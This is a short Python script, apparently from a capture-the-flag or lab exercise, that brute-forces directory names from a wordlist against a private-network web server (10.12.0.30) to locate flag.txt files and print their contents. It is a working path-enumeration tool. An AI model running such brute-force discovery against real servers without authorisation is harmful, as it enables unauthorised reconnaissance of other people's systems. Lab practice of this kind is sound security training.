#Directory Brute Force
#Mackenzie Summers
#Run from Win10

import requests
def capture():
    final_dirs = []
    try:
        myfile = open("dirs.txt")
        dirs = myfile.readlines()
        myfile.close()
    except:
        print("No file dirs.txt found")
        return 
    for dir in dirs:
        url = "http://10.12.0.30/" + dir.strip() + "/flag.txt"
        resp = requests.get(url)   
        if "404" not in resp.text:
            final_dirs.append([resp.text, url])
    print("The following Flags were Found\n")
    for item in final_dirs:
        print("Flag:{}{}Location:{}".format(item[0].strip(), " "*(50- (len(item[0].strip()))),item[1]))
print("\n Directory Brute Forcing\n")
capture()
